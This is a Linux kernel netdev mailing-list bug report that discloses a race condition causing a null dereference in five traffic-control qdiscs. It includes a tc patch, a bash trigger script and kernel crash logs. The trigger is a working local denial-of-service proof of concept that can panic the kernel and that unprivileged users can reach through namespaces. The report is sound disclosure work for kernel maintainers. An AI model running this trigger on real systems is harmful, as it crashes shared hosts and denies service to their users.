Return-Path: <netdev+bounces-186002-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 7B510A9CB3D
	for <lists+netdev@lfdr.de>; Fri, 25 Apr 2025 16:14:28 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id E4BFB3AC416
	for <lists+netdev@lfdr.de>; Fri, 25 Apr 2025 14:14:10 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id A770B2550D8;
	Fri, 25 Apr 2025 14:14:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=fail reason="signature verification failed" (2048-bit key) header.d=protonmail.com header.i=@protonmail.com header.b="hqXzW0Nj"
X-Original-To: netdev@vger.kernel.org
Received: from mail-10628.protonmail.ch (mail-10628.protonmail.ch [79.135.106.28])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C1584253952
	for <netdev@vger.kernel.org>; Fri, 25 Apr 2025 14:14:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=79.135.106.28
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1745590463; cv=none; b=eWdD2SU/x6nYlxvwl0y267HuaCgCqKOIe8neIwVB9Bsb4pis8+iD0lmL56i4b7c3VIlhInMhYg0CjOCfkFVX/qFj+m9RQFK9Ez0HcwQ5nn0E+UiTPpmOA7jsMxAP//3TgpRbp8i6fWLIzF93emAiC3M7AmkV6P4rKOi92939vP8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1745590463; c=relaxed/simple;
	bh=L+pJpzn+tlkIqdi6rOB51ZJmJN3KKL5yYha2AIlIm+M=;
	h=Date:To:From:Cc:Subject:Message-ID:MIME-Version:Content-Type; b=fQqi/iWkfGZza91gAbtPUqDOuJGXIVVXjJgp/S/LukBkBgBiJl6pnx05KkOTwZgVn0nBh6Pmt+h0+4i1KRBF8q7cYa5k41vqCtHcaHHv1RMR109XSomViVRFPpVUIlRh9t3rH4cT9uBRJZOVMkMpU1k3NSCAkhAT2gBhe1tqdnU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=protonmail.com; spf=pass smtp.mailfrom=protonmail.com; dkim=pass (2048-bit key) header.d=protonmail.com header.i=@protonmail.com header.b=hqXzW0Nj; arc=none smtp.client-ip=79.135.106.28
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=protonmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=protonmail.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=protonmail.com;
	s=protonmail3; t=1745590452; x=1745849652;
	bh=EROnxCTb8HhuOrj3zghgugKle/i15kXbGu/EG1MjUkk=;
	h=Date:To:From:Cc:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector:
	 List-Unsubscribe:List-Unsubscribe-Post;
	b=hqXzW0NjlRtxw7nVq3j3BfgVEA1+lH6fLdEFuYKaULRgSXdc7XDbwVIDjALrtn2mq
	 78zL850QRfPezm/M7SizuuCi+HXTbvTW3rrZI9i186t4W5HqSGO9RoidiA5zZvo+rU
	 kFsXiJ3aalR7xVsASmrY6gwpEfIwZ/0oWKlHbD9TUNugRhd7g1jO1wTsGjTLMy2Gbs
	 xuTzu2gwn/7ZAAhbhTIm89u/Bd5H+osThHBWDWJRfgPsuOHhl45lQbOeGhk2fEQvVa
	 GOZGvd+DI0bFLRqxaSI9Abt1kgnTSaUPL+E4hrDG1t8Zivcq+NFGGHIc8XNac4z9RM
	 YXa92wTH6a/hQ==
Date: Fri, 25 Apr 2025 14:14:07 +0000
To: "netdev@vger.kernel.org" <netdev@vger.kernel.org>
From: Will <willsroot@protonmail.com>
Cc: Savy <savy@syst3mfailure.io>
Subject: [BUG] net/sched: Race Condition and Null Dereference in codel_change, pie_change, fq_pie_change, fq_codel_change, hhf_change
Message-ID: <UTd8zf-_MMCqMv9R15RSDZybxtCeV9czSvpeaslK7984UCPTX8pbSFVyWhzqiaA6HYFZtHIldd7guvr7_8xVfkk9xSUHnY3e8dSWi7pdVsE=@protonmail.com>
Feedback-ID: 25491499:user:proton
X-Pm-Message-ID: 61e978b335ee89a20073bf4bee62f12e34dd64ac
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Hi all,

We've encountered and triaged the following race condition that occurs acro=
ss 5 different qdiscs: codel, pie, fq_pie, fq_codel, and hhf. It came up on=
 a modified version of Syzkaller we're working on for a research project. I=
t works on upstream (02ddfb981de88a2c15621115dd7be2431252c568), the 6.6 LTS=
 branch, and the 6.1 LTS branch and has existed since at least 2016 (and ea=
rlier too for some of the other listed qdiscs): https://github.com/torvalds=
/linux/commit/2ccccf5fb43ff62b2b9.

We will take codel_change as the main example here, as the other vulnerable=
 qdiscs change functions follow the same pattern. When the limit changes, t=
he qdisc attempts to shrink the queue size back under the limit: https://el=
ixir.bootlin.com/linux/v6.15-rc3/source/net/sched/sch_codel.c#L146. However=
, this is racy against a qdisc's dequeue function. This limit check could p=
ass and the qdisc will attempt to dequeue the head, but the actual qdisc's =
dequeue function (codel_qdisc_dequeue in this case) could run. This would l=
ead to the dequeued skb being null in the change function when only one pac=
ket remains in the queue, so when the function calls qdisc_pkt_len(skb), a =
null dereference exception would occur.

Here is the setup for a PoC. All VMs are booted with the following paramete=
rs:

qemu-system-x86_64 \
        -m 4G \
        -smp 2 \
        -kernel $KERNEL/arch/x86/boot/bzImage \
        -append "console=3DttyS0 root=3D/dev/sda earlyprintk=3Dserial net.i=
fnames=3D0" \
        -drive file=3D$IMAGE/bullseye.img,format=3Draw \
        -snapshot \
        -net user,host=3D10.0.2.10,hostfwd=3Dtcp:127.0.0.1:10021-:22 \
        -net nic,model=3De1000 \
        -enable-kvm \
        -nographic

Clone https://github.com/iproute2/iproute2

We were at 866e1d107b7de68ca1fcd1d4d5ffecf9d96bff30.

Apply the following patch to for tc to accept 0 limits. Note that we are ju=
st using tc for ease of understanding, and 0 limits are perfectly acceptabl=
e from the normal syscall routes (but tc filters against it).

diff --git a/tc/q_codel.c b/tc/q_codel.c
index 15029b4c..c438ebef 100644
--- a/tc/q_codel.c
+++ b/tc/q_codel.c
@@ -37,6 +37,7 @@ static int codel_parse_opt(const struct qdisc_util *qu, i=
nt argc, char **argv,
    unsigned int ce_threshold =3D ~0U;
    int ecn =3D -1;
    struct rtattr *tail;
+   bool has_limit =3D false;
=20
    while (argc > 0) {
        if (strcmp(*argv, "limit") =3D=3D 0) {
@@ -45,6 +46,7 @@ static int codel_parse_opt(const struct qdisc_util *qu, i=
nt argc, char **argv,
                fprintf(stderr, "Illegal \"limit\"\n");
                return -1;
            }
+           has_limit =3D true;
        } else if (strcmp(*argv, "target") =3D=3D 0) {
            NEXT_ARG();
            if (get_time(&target, *argv)) {
@@ -79,7 +81,7 @@ static int codel_parse_opt(const struct qdisc_util *qu, i=
nt argc, char **argv,
    }
=20
    tail =3D addattr_nest(n, 1024, TCA_OPTIONS);
-   if (limit)
+   if (limit || has_limit)
        addattr_l(n, 1024, TCA_CODEL_LIMIT, &limit, sizeof(limit));
    if (interval)
        addattr_l(n, 1024, TCA_CODEL_INTERVAL, &interval, sizeof(interval))=
;
diff --git a/tc/q_fq_codel.c b/tc/q_fq_codel.c
index a619d2b3..f81bd5cb 100644
--- a/tc/q_fq_codel.c
+++ b/tc/q_fq_codel.c
@@ -44,6 +44,7 @@ static int fq_codel_parse_opt(const struct qdisc_util *qu=
, int argc, char **argv
    __u8 ce_threshold_selector =3D 0xFF;
    int ecn =3D -1;
    struct rtattr *tail;
+   bool has_limit =3D false;
=20
    while (argc > 0) {
        if (strcmp(*argv, "limit") =3D=3D 0) {
@@ -52,6 +53,7 @@ static int fq_codel_parse_opt(const struct qdisc_util *qu=
, int argc, char **argv
                fprintf(stderr, "Illegal \"limit\"\n");
                return -1;
            }
+           has_limit =3D true;
        } else if (strcmp(*argv, "flows") =3D=3D 0) {
            NEXT_ARG();
            if (get_unsigned(&flows, *argv, 0)) {
@@ -128,7 +130,7 @@ static int fq_codel_parse_opt(const struct qdisc_util *=
qu, int argc, char **argv
    }
=20
    tail =3D addattr_nest(n, 1024, TCA_OPTIONS);
-   if (limit)
+   if (limit || has_limit)
        addattr_l(n, 1024, TCA_FQ_CODEL_LIMIT, &limit, sizeof(limit));
    if (flows)
        addattr_l(n, 1024, TCA_FQ_CODEL_FLOWS, &flows, sizeof(flows));
diff --git a/tc/q_fq_pie.c b/tc/q_fq_pie.c
index dc2710cd..5f63c15b 100644
--- a/tc/q_fq_pie.c
+++ b/tc/q_fq_pie.c
@@ -52,6 +52,7 @@ static int fq_pie_parse_opt(const struct qdisc_util *qu, =
int argc, char **argv,
    int bytemode =3D -1;
    int dq_rate_estimator =3D -1;
    struct rtattr *tail;
+   bool has_limit =3D false;
=20
    while (argc > 0) {
        if (strcmp(*argv, "limit") =3D=3D 0) {
@@ -60,6 +61,7 @@ static int fq_pie_parse_opt(const struct qdisc_util *qu, =
int argc, char **argv,
                fprintf(stderr, "Illegal \"limit\"\n");
                return -1;
            }
+           has_limit =3D true;
        } else if (strcmp(*argv, "flows") =3D=3D 0) {
            NEXT_ARG();
            if (get_unsigned(&flows, *argv, 0)) {
@@ -137,7 +139,7 @@ static int fq_pie_parse_opt(const struct qdisc_util *qu=
, int argc, char **argv,
    }
=20
    tail =3D addattr_nest(n, 1024, TCA_OPTIONS | NLA_F_NESTED);
-   if (limit)
+   if (limit || has_limit)
        addattr_l(n, 1024, TCA_FQ_PIE_LIMIT, &limit, sizeof(limit));
    if (flows)
        addattr_l(n, 1024, TCA_FQ_PIE_FLOWS, &flows, sizeof(flows));
diff --git a/tc/q_hhf.c b/tc/q_hhf.c
index 939e4909..8837e99d 100644
--- a/tc/q_hhf.c
+++ b/tc/q_hhf.c
@@ -37,6 +37,7 @@ static int hhf_parse_opt(const struct qdisc_util *qu, int=
 argc, char **argv,
    unsigned int evict_timeout =3D 0;
    unsigned int non_hh_weight =3D 0;
    struct rtattr *tail;
+   bool has_limit =3D false;
=20
    while (argc > 0) {
        if (strcmp(*argv, "limit") =3D=3D 0) {
@@ -45,6 +46,7 @@ static int hhf_parse_opt(const struct qdisc_util *qu, int=
 argc, char **argv,
                fprintf(stderr, "Illegal \"limit\"\n");
                return -1;
            }
+           has_limit =3D true;
        } else if (strcmp(*argv, "quantum") =3D=3D 0) {
            NEXT_ARG();
            if (get_unsigned(&quantum, *argv, 0)) {
@@ -93,7 +95,7 @@ static int hhf_parse_opt(const struct qdisc_util *qu, int=
 argc, char **argv,
    }
=20
    tail =3D addattr_nest(n, 1024, TCA_OPTIONS);
-   if (limit)
+   if (limit || has_limit)
        addattr_l(n, 1024, TCA_HHF_BACKLOG_LIMIT, &limit,
              sizeof(limit));
    if (quantum)
diff --git a/tc/q_pie.c b/tc/q_pie.c
index 04c9aa61..922e4194 100644
--- a/tc/q_pie.c
+++ b/tc/q_pie.c
@@ -42,6 +42,7 @@ static int pie_parse_opt(const struct qdisc_util *qu, int=
 argc, char **argv,
    int bytemode =3D -1;
    int dq_rate_estimator =3D -1;
    struct rtattr *tail;
+   bool has_limit =3D false;
=20
    while (argc > 0) {
        if (strcmp(*argv, "limit") =3D=3D 0) {
@@ -50,6 +51,7 @@ static int pie_parse_opt(const struct qdisc_util *qu, int=
 argc, char **argv,
                fprintf(stderr, "Illegal \"limit\"\n");
                return -1;
            }
+           has_limit =3D true;
        } else if (strcmp(*argv, "target") =3D=3D 0) {
            NEXT_ARG();
            if (get_time(&target, *argv)) {
@@ -101,7 +103,7 @@ static int pie_parse_opt(const struct qdisc_util *qu, i=
nt argc, char **argv,
    }
=20
    tail =3D addattr_nest(n, 1024, TCA_OPTIONS);
-   if (limit)
+   if (limit || has_limit)
        addattr_l(n, 1024, TCA_PIE_LIMIT, &limit, sizeof(limit));
    if (tupdate)
        addattr_l(n, 1024, TCA_PIE_TUPDATE, &tupdate, sizeof(tupdate));


Create the following trigger script.

#!/bin/bash

# --------------------------------------------------------------------
# Authors: Will (will@willsroot.io) and Savy (savy@syst3mfailure.io)
# Description: null-ptr-deref across 4 qdiscs from xxx_change function
# --------------------------------------------------------------------

if [ $# -eq 0 ]; then
        echo "Usage: $0 <codel/pie/fq_codel/fq_pie/hhf>"
        exit 1
fi

send_packets() {
        while true; do
                ping -I lo -f -c10000 -s64 -W0.00001 127.0.0.1 2>&1 > /dev/=
null
        done
}

crash() {
        local name=3D$1 limit=3D1
        ./tc qdisc add dev lo root handle 1: tbf limit 10000 burst 10000 ra=
te 100000
        ./tc qdisc add dev lo parent 1: handle 2: "$name" limit $limit
        send_packets &
        while true; do
                limit=3D$((1 - limit))
                ./tc qdisc change dev lo parent 1: handle 2: "$name" limit =
$limit
        done
}

case $1 in
        codel|pie|fq_codel|fq_pie|hhf)
                echo "Triggering crash in $1..."
                crash "$1"
                ;;
        *)
                echo "Error: Invalid qdisc!"
                echo "Usage: $0 <codel/pie/fq_codel/fq_pie/hhf>"
                exit 1
                ;;
esac

The root qdisc is a tbf because some of the vulnerable qdiscs like codel en=
able TCQ_F_CAN_BYPASS but we need to force packets to go through the vulner=
able qdisc enqueue and dequeue path.

Now run the trigger script (in the case, we are targeting codel) and the fo=
llowing crash should pop up:

[  449.504139] Oops: general protection fault, probably for non-canonical a=
ddress 0xdffffc0000000005: 0000 [#1] SMP KASAN NOPTI
[  449.508066] KASAN: null-ptr-deref in range [0x0000000000000028-0x0000000=
00000002f]
[  449.510897] CPU: 0 UID: 0 PID: 237 Comm: tc Not tainted 6.15.0-rc3-00094=
-g02ddfb981de8 #3 PREEMPT(voluntary)=20
[  449.514510] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), B=
IOS 1.16.3-debian-1.16.3-2 04/01/2014
[  449.518085] RIP: 0010:codel_change+0x4b9/0x850
[  449.519779] Code: e0 07 83 c0 03 88 44 24 33 e9 e2 00 00 00 e8 ae be 8a =
fd 49 c7 07 00 00 00 00 e8 a2 be 8a fd 49 8d 7f 28 48 89 fa 48 c1 ea 03 <0f=
> b6 0c 2a 48 89 fa 83 e2 07 83 c2 03 38 ca 7c 08 84 c9 0f 86
[  449.526388] RSP: 0018:ffff88801451f3f8 EFLAGS: 00010216
[  449.528258] RAX: 0000000000000000 RBX: ffff88800bffb000 RCX: ffff88800bf=
fb144
[  449.530804] RDX: 0000000000000005 RSI: ffffffff83f37f2e RDI: 00000000000=
00028
[  449.533366] RBP: dffffc0000000000 R08: 0000000000000004 R09: 00000000000=
00001
[  449.535919] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000000=
00001
[  449.538460] R13: 0000000000000000 R14: ffff88800bffb014 R15: 00000000000=
00000
[  449.540999] FS:  00007fe011b4fb80(0000) GS:ffff8880e5172000(0000) knlGS:=
0000000000000000
[  449.543943] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  449.546037] CR2: 00005646cac478e0 CR3: 0000000011e5a000 CR4: 00000000000=
006f0
[  449.548517] Call Trace:
[  449.549403]  <TASK>
[  449.550202]  ? __pfx_codel_change+0x10/0x10
[  449.551755]  ? find_held_lock+0x2b/0x80
[  449.553191]  ? nla_strcmp+0xff/0x130
[  449.554552]  ? __pfx_codel_change+0x10/0x10
[  449.556202]  tc_modify_qdisc+0x7c2/0x21e0
[  449.558029]  ? __pfx_tc_modify_qdisc+0x10/0x10
[  449.560129]  ? rtnetlink_rcv_msg+0x1f9/0xf60
[  449.562075]  ? find_held_lock+0x2b/0x80
[  449.563836]  ? lock_is_held_type+0x8f/0x100
[  449.565764]  ? __pfx_tc_modify_qdisc+0x10/0x10
[  449.567850]  rtnetlink_rcv_msg+0x3c9/0xf60
[  449.569834]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  449.571982]  netlink_rcv_skb+0x16d/0x440
[  449.573826]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  449.575984]  ? __pfx_netlink_rcv_skb+0x10/0x10
[  449.578087]  ? netlink_deliver_tap+0x1ae/0xdc0
[  449.580123]  ? is_vmalloc_addr+0x86/0xa0
[  449.581984]  netlink_unicast+0x53d/0x7f0
[  449.583791]  ? __pfx_netlink_unicast+0x10/0x10
[  449.585904]  netlink_sendmsg+0x8f8/0xdb0
[  449.587747]  ? __pfx_netlink_sendmsg+0x10/0x10
[  449.589844]  ____sys_sendmsg+0xa92/0xcc0
[  449.591750]  ? copy_msghdr_from_user+0x10a/0x160
[  449.593900]  ? __pfx_____sys_sendmsg+0x10/0x10
[  449.595998]  ___sys_sendmsg+0x134/0x1d0
[  449.597716]  ? __pfx____sys_sendmsg+0x10/0x10
[  449.599782]  ? cgroup_rstat_updated+0x2a/0xa40
[  449.601816]  ? lock_acquire+0x150/0x2f0
[  449.603598]  __sys_sendmsg+0x16d/0x220
[  449.605366]  ? __pfx___sys_sendmsg+0x10/0x10
[  449.607339]  ? trace_irq_enable.constprop.0+0xc2/0x110
[  449.609391]  do_syscall_64+0xc1/0x1d0
[  449.610745]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  449.612579] RIP: 0033:0x7fe011d7b004
[  449.614027] Code: 15 19 6e 0d 00 f7 d8 64 89 02 b8 ff ff ff ff eb bf 0f =
1f 44 00 00 f3 0f 1e fa 80 3d 45 f0 0d 00 00 74 13 b8 2e 00 00 00 0f 05 <48=
> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 85
[  449.620272] RSP: 002b:00007ffc9de801a8 EFLAGS: 00000202 ORIG_RAX: 000000=
000000002e
[  449.622775] RAX: ffffffffffffffda RBX: 00005646cac46480 RCX: 00007fe011d=
7b004
[  449.625325] RDX: 0000000000000000 RSI: 00007ffc9de80210 RDI: 00000000000=
00003
[  449.627752] RBP: 00000000680b834a R08: 0000000000000010 R09: 00000000000=
00000
[  449.630205] R10: 00005646e04f68f0 R11: 0000000000000202 R12: 00007ffc9de=
80210
[  449.632615] R13: 00005646cac46480 R14: 00005646cac1f1fa R15: 00005646cac=
1f21e
[  449.634958]  </TASK>
[  449.635718] Modules linked in:
[  449.636847] ---[ end trace 0000000000000000 ]---
[  449.638846] RIP: 0010:codel_change+0x4b9/0x850
[  449.640533] Code: e0 07 83 c0 03 88 44 24 33 e9 e2 00 00 00 e8 ae be 8a =
fd 49 c7 07 00 00 00 00 e8 a2 be 8a fd 49 8d 7f 28 48 89 fa 48 c1 ea 03 <0f=
> b6 0c 2a 48 89 fa 83 e2 07 83 c2 03 38 ca 7c 08 84 c9 0f 86
[  449.647166] RSP: 0018:ffff88801451f3f8 EFLAGS: 00010216
[  449.649179] RAX: 0000000000000000 RBX: ffff88800bffb000 RCX: ffff88800bf=
fb144
[  449.651863] RDX: 0000000000000005 RSI: ffffffff83f37f2e RDI: 00000000000=
00028
[  449.654543] RBP: dffffc0000000000 R08: 0000000000000004 R09: 00000000000=
00001
[  449.657242] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000000=
00001
[  449.660044] R13: 0000000000000000 R14: ffff88800bffb014 R15: 00000000000=
00000
[  449.662691] FS:  00007fe011b4fb80(0000) GS:ffff8880e5172000(0000) knlGS:=
0000000000000000
[  449.665617] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  449.667709] CR2: 00005646cac478e0 CR3: 0000000011e5a000 CR4: 00000000000=
006f0
[  449.670318] Kernel panic - not syncing: Fatal exception in interrupt
[  449.672916] Kernel Offset: disabled
[  449.674345] ---[ end Kernel panic - not syncing: Fatal exception in inte=
rrupt ]---

This can be triggered from any user with CAP_NET, so unprivileged users can=
 access this through namespaces.

Note that for the hhf qdisc, only a soft lockup can be triggered as it does=
 not have the subsequent qdisc_pkt_len(skb).

[   56.906193] watchdog: BUG: soft lockup - CPU#0 stuck for 26s! [swapper/0=
:0]
[   56.906230] Modules linked in:
[   56.906239] irq event stamp: 204649
[   56.906244] hardirqs last  enabled at (204648): [<ffffffff8100148a>] asm=
_sysvec_apic_timer_interrupt+0x1a/0x20
[   56.906286] hardirqs last disabled at (204649): [<ffffffff84bab63e>] sys=
vec_apic_timer_interrupt+0xe/0x80
[   56.906305] softirqs last  enabled at (204414): [<ffffffff8144bcde>] han=
dle_softirqs+0x56e/0x840
[   56.906327] softirqs last disabled at (204421): [<ffffffff8144c0e4>] __i=
rq_exit_rcu+0xc4/0x100
[   56.906351] CPU: 0 UID: 0 PID: 0 Comm: swapper/0 Not tainted 6.15.0-rc3-=
00094-g02ddfb981de8 #3 PREEMPT(voluntary)=20
[   56.906368] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), B=
IOS 1.16.3-debian-1.16.3-2 04/01/2014
[   56.906376] RIP: 0010:queued_spin_lock_slowpath+0x313/0xbf0
[   56.906394] Code: c5 10 94 8e 86 e8 5d d8 fd fc 48 0f a3 1d 55 62 d1 01 =
0f 82 12 03 00 00 65 ff 0d c4 26 0f 03 e9 f3 fd ff ff 89 44 24 40 f3 90 <e9=
> 91 fd ff ff f0 0f ba 2b 08 be 04 00 00 00 48 89 df 40 0f 95
[   56.906406] RSP: 0018:ffff88806ce08d80 EFLAGS: 00000202
[   56.906417] RAX: 0000000000000001 RBX: ffff88800b7f28f0 RCX: ffffffff84b=
d2f76
[   56.906427] RDX: ffffed10016fe51f RSI: 0000000000000004 RDI: ffff88800b7=
f28f0
[   56.906437] RBP: 0000000000000001 R08: 0000000000000000 R09: ffffed10016=
fe51e
[   56.906447] R10: ffff88800b7f28f3 R11: 0000000000000000 R12: 1ffff1100d9=
c11b2
[   56.906456] R13: 0000000000000003 R14: ffffed10016fe51e R15: ffff88806ce=
08dc0
[   56.906468] FS:  0000000000000000(0000) GS:ffff8880e5172000(0000) knlGS:=
0000000000000000
[   56.906484] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   56.906495] CR2: 0000557f8966a208 CR3: 000000001553a000 CR4: 00000000000=
006f0
[   56.906504] Call Trace:
[   56.906511]  <IRQ>
[   56.906517]  ? __lock_acquire+0xe1b/0x1c90
[   56.906534]  ? __pfx_queued_spin_lock_slowpath+0x10/0x10
[   56.906557]  do_raw_spin_lock+0x1e3/0x270
[   56.906574]  ? __pfx_do_raw_spin_lock+0x10/0x10
[   56.906597]  net_tx_action+0x504/0xc60
[   56.906618]  handle_softirqs+0x1fc/0x840
[   56.906641]  ? __pfx_handle_softirqs+0x10/0x10
[   56.906663]  __irq_exit_rcu+0xc4/0x100
[   56.906681]  irq_exit_rcu+0x9/0x20
[   56.906698]  sysvec_apic_timer_interrupt+0x6c/0x80
[   56.906714]  </IRQ>
[   56.906718]  <TASK>
[   56.906723]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[   56.906739] RIP: 0010:pv_native_safe_halt+0xf/0x20
[   56.906754] Code: 68 c6 00 c3 cc cc cc cc 0f 1f 00 90 90 90 90 90 90 90 =
90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d 33 b6 0a 00 fb f4 <c3=
> cc cc cc cc 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90
[   56.906766] RSP: 0018:ffffffff85a07e08 EFLAGS: 00000202
[   56.906777] RAX: 0000000000031e83 RBX: 0000000000000000 RCX: ffffffff84b=
accc5
[   56.906786] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffffffff815=
63977
[   56.906794] RBP: fffffbfff0b45e18 R08: 0000000000000001 R09: ffffed100d9=
c628a
[   56.906803] R10: ffff88806ce31453 R11: 0000000000000000 R12: ffffffff85a=
2f0c0
[   56.906812] R13: ffffffff868e9410 R14: 1ffffffff0b40fc7 R15: 00000000000=
00000
[   56.906826]  ? ct_kernel_exit.constprop.0+0xc5/0xf0
[   56.906844]  ? do_idle+0x377/0x4f0
[   56.906861]  default_idle+0x9/0x10
[   56.906877]  default_idle_call+0x6d/0xb0
[   56.906894]  do_idle+0x377/0x4f0
[   56.906910]  ? __pfx_do_idle+0x10/0x10
[   56.906924]  ? rest_init+0x15b/0x320
[   56.906946]  cpu_startup_entry+0x4f/0x60
[   56.906962]  rest_init+0x16f/0x320
[   56.906981]  start_kernel+0x420/0x560
[   56.907002]  x86_64_start_reservations+0x18/0x30
[   56.907019]  x86_64_start_kernel+0xca/0xe0
[   56.907034]  common_startup_64+0x13e/0x148
[   56.907061]  </TASK>
[   56.913177] watchdog: BUG: soft lockup - CPU#1 stuck for 27s! [tc:227]
[   56.913198] Modules linked in:
[   56.913206] irq event stamp: 57997
[   56.913223] hardirqs last  enabled at (57996): [<ffffffff84baca2b>] irqe=
ntry_exit+0x3b/0x90
[   56.913251] hardirqs last disabled at (57997): [<ffffffff84bab63e>] sysv=
ec_apic_timer_interrupt+0xe/0x80
[   56.913268] softirqs last  enabled at (4946): [<ffffffff843dbf0f>] inet6=
_fill_ifla6_attrs+0x1b3f/0x21a0
[   56.913287] softirqs last disabled at (5076): [<ffffffff83f64a06>] hhf_c=
hange+0x266/0x930
[   56.913313] CPU: 1 UID: 0 PID: 227 Comm: tc Tainted: G             L    =
  6.15.0-rc3-00094-g02ddfb981de8 #3 PREEMPT(voluntary)=20
[   56.913334] Tainted: [L]=3DSOFTLOCKUP
[   56.913339] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), B=
IOS 1.16.3-debian-1.16.3-2 04/01/2014
[   56.913348] RIP: 0010:__sanitizer_cov_trace_pc+0x8/0x70
[   56.913372] Code: e9 5d 45 35 00 be 03 00 00 00 5b e9 e2 6d de 00 66 90 =
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 8b 34 24 <65=
> 48 8b 15 38 a2 4c 06 65 8b 05 49 a2 4c 06 a9 00 01 ff 00 7d
[   56.913386] RSP: 0018:ffff88801197f3a0 EFLAGS: 00000246
[   56.913397] RAX: ffff88800b7f4b98 RBX: dffffc0000000000 RCX: ffffffff83f=
64e2e
[   56.913407] RDX: ffff888011de3500 RSI: ffffffff83f6387e RDI: ffff88800b7=
f4800
[   56.913416] RBP: ffff88800b7f4800 R08: 0000000000000004 R09: 00000000000=
00001
[   56.913424] R10: 0000000000000000 R11: 0000000000000000 R12: ffff88800b7=
f4b98
[   56.913432] R13: 0000000000000000 R14: 1ffff110016fe902 R15: 00000000000=
00001
[   56.913444] FS:  00007f4bd2ac7b80(0000) GS:ffff8880e5272000(0000) knlGS:=
0000000000000000
[   56.913458] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   56.913468] CR2: 00005651334178e0 CR3: 000000000deba000 CR4: 00000000000=
006f0
[   56.913477] Call Trace:
[   56.913485]  <TASK>
[   56.913490]  hhf_dequeue+0x4ce/0x6f0
[   56.913512]  hhf_change+0x64c/0x930
[   56.913531]  ? __pfx_hhf_change+0x10/0x10
[   56.913545]  ? find_held_lock+0x2b/0x80
[   56.913570]  ? nla_strcmp+0xff/0x130
[   56.913590]  ? __pfx_hhf_change+0x10/0x10
[   56.913604]  tc_modify_qdisc+0x7c2/0x21e0
[   56.913629]  ? __pfx_tc_modify_qdisc+0x10/0x10
[   56.913659]  ? rtnetlink_rcv_msg+0x1f9/0xf60
[   56.913677]  ? find_held_lock+0x2b/0x80
[   56.913695]  ? lock_is_held_type+0x8f/0x100
[   56.913712]  ? __pfx_tc_modify_qdisc+0x10/0x10
[   56.913730]  rtnetlink_rcv_msg+0x3c9/0xf60
[   56.913750]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[   56.913778]  netlink_rcv_skb+0x16d/0x440
[   56.913799]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[   56.913818]  ? __pfx_netlink_rcv_skb+0x10/0x10
[   56.913849]  ? netlink_deliver_tap+0x1ae/0xdc0
[   56.913867]  ? is_vmalloc_addr+0x86/0xa0
[   56.913890]  netlink_unicast+0x53d/0x7f0
[   56.913913]  ? __pfx_netlink_unicast+0x10/0x10
[   56.913940]  netlink_sendmsg+0x8f8/0xdb0
[   56.913964]  ? __pfx_netlink_sendmsg+0x10/0x10
[   56.913993]  ____sys_sendmsg+0xa92/0xcc0
[   56.914017]  ? copy_msghdr_from_user+0x10a/0x160
[   56.914036]  ? __pfx_____sys_sendmsg+0x10/0x10
[   56.914069]  ___sys_sendmsg+0x134/0x1d0
[   56.914087]  ? __pfx____sys_sendmsg+0x10/0x10
[   56.914123]  ? cgroup_rstat_updated+0x2a/0xa40
[   56.914139]  ? lock_acquire+0x150/0x2f0
[   56.914155]  __sys_sendmsg+0x16d/0x220
[   56.914172]  ? __pfx___sys_sendmsg+0x10/0x10
[   56.914200]  ? trace_irq_enable.constprop.0+0xc2/0x110
[   56.914236]  do_syscall_64+0xc1/0x1d0
